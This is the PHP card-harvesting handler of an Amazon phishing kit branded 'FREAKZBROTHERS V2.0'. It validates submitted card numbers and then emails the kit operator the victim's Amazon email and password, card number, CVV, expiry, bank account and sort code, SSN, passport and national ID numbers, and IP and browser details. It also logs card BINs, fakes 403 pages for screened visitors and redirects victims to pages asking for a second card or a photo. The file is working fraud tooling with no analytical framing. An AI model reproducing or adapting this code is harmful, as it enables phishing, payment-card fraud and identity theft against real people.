<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once('../session.php');
$ip = getUserIP();
$randomnumber = rand(1, 100);
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }
if($_POST['ccno'] == "") {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$valid = validatecard($_POST['ccno']);
if($valid == false) {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['exp_tahun'] < 19) {
    tulis_file("../security/onetime.dat","$ip");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['exp_bulan'] > 12) {
    tulis_file("../security/onetime.dat","$ip");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$antidouble = md5($_POST['ccno']);
$_SESSION['ending'] = substr($_POST['ccno'], -4);
$bin = check_bin($_POST['ccno']);
$ispuser = getisp($ip);
$phone = check_carrier($_SESSION['phone']);
$message  = "++++++++++++++++++++++++[ FREAKZBROTHERS V2.0 ]+++++++++++++++++++++++++++\n";
$message .= "+--------------------------[ AMAZON ACCOUNT ]-------------------------+\n";
$message .= "# AMAZON ACCOUNT       : ".$_SESSION['email']."\n";
$message .= "# PASSWORD                   : ".$_SESSION['password']."\n";
$message .= "+--------------------------[ CARD DETAILS ]-------------------------+\n";
$message .= "# BANK                             : ".$bin["bank"]["name"]."\n";
$message .= "# TYPE                             : ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
$message .= "# LEVEL			         : ".strtoupper($bin["brand"])."\n";
$message .= "# CARDHOLDERS            : ".$_POST['ccname']."\n";
$message .= "# CC NUMBER	                 : ".$_POST['ccno']."\n";
$message .= "# EXPIRED                       : ".$_POST['exp_bulan']."/".$_POST['exp_tahun']."\n";
$message .= "# CVV                              : ".$_POST['cvv']."\n";
$message .= "# AMEX CID 		        : ".$_POST['cid']."\n";
$message .= "# ACCOUNT NUMBER	: ".$_POST['acno']."\n";
$message .= "# SORT CODE		: ".$_POST['sortcode']."\n";
$message .= "# CREDIT LIMIT               : ".$_POST['climit']."\n";
$message .= "# FOR CHECK                 : ".$_POST['ccno']."|".$_POST['exp_bulan']."|".$_POST['exp_tahun']."\n";
$message .= "+--------------------------[ JAPAN INFO ]-------------------------+\n";
$message .= "# WEB ID				: ".$_POST['cardid']."\n";
$message .= "# CARD PASSWORD	: ".$_POST['passjp']."\n";
if($config['get_billing'] == "on") {
$message .= "+--------------------------[ BILLING ADDRESS ]-------------------------+\n";
$message .= "# FULL NAME		: ".$_SESSION['fullname']."\n";
$message .= "# ADDRESS		: ".$_SESSION['address']."\n";
$message .= "# CITY			: ".$_SESSION['city']."\n";
$message .= "# STATE			: ".$_SESSION['state']."\n";
$message .= "# COUNTRY		: ".$_SESSION['country']."\n";
$message .= "# ZIP			: ".$_SESSION['zipcode']."\n";
$message .= "# DOB			: ".$_SESSION['dob']."\n";
$message .= "# PHONE			: ".$_SESSION['phone']."\n";
$message .= "# PHONE CARRIER    : ".$phone."\n";
$message .= "+--------------------------[ OTHER INFO ]-------------------------+\n";
$message .= "# ID NUMBER					: ".$_SESSION['numbid']."\n";
$message .= "# CIVIL ID					        : ".$_SESSION['civilid']."\n";
$message .= "# QATAR ID					: ".$_SESSION['qatarid']."\n";
$message .= "# NATIONAL ID                                : ".$_SESSION['naid']."\n";
$message .= "# CITIZEN ID					: ".$_SESSION['naid']."\n";
$message .= "# PASSPORT NUMBER			: ".$_SESSION['passport']."\n";
$message .= "# BANK ACCESS NUMBER              : ".$_SESSION['bans']."\n";
$message .= "# SOCIAL INSURANCE NUMBER	: ".$_SESSION['sin']."\n";
$message .= "# SOCIAL SECURITY NUMBER	: ".$_SESSION['ssn']."\n";
$message .= "# OSID NUMBER				: ".$_SESSION['osidnumber']."\n";
}
$message .= "+--------------------------[ PC INFO ]-------------------------+\n";
$message .= "# IP ADDRESS		: ".$ip."\n";
$message .= "# ISP			: ".$ispuser."\n";
$message .= "# REGION                : ".$regioncity."\n";
$message .= "# CITY		        : ".$citykota."\n";
$message .= "# CONTINENT		: ".$continent."\n";
$message .= "# TIMEZONE		: ".$timezone."\n";
$message .= "# OS/BROWSER	: ".$os." / ".$br."\n";
$message .= "# DATE			: ".$date."\n";
$message .= "# USER AGENT	: ".$user_agent."\n";
$message .= "++++++++++++++++++++++++[ FREAKZBROTHERS V2.0 ]+++++++++++++++++++++++++++\n";

$_SESSION['email'] = $_POST['emailLogin'];
$bins = preg_replace('/\s/', '', $_POST['ccno']);
$bins = substr($bins,0,6);
$_SESSION['from'] = $_POST['fullname'];
$to = $config['email_result'];
$headers = "From: ".$_POST['ccname']." <freakzbrothers-v2.0-$randomnumber@freakz.site>";
if($config['get_billing'] == "on") {
	$from = $_SESSION['fullname'];
}else{
	$from = $_POST['ccname'];
}
if($bin["brand"] == "") {
		$subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." // $os - $ip - $cn";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
}else{
		$subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." // $os - $ip - $cn";
    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
if($antidouble == $_SESSION['anti_double']) {
}else{
	mail($to, $subject, $message, $headers);
	tulis_file("../result/total_cc.txt", $ip);
	tulis_file("../result/total_bin.txt","$subbin\n");
}
$_SESSION['anti_double'] = md5($_POST['ccno']);

if($_SESSION['cc_pertama'] == "udah") {
}else{
	if($config['double_cc'] == "Yes") {
		$_SESSION['cc_pertama'] = "udah";
			echo "<script type='text/javascript'>window.top.location='../ap/payment?session=$key&error=1';</script>";
	}
}

if($config['get_photo'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
	exit();
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
exit();
}
?>
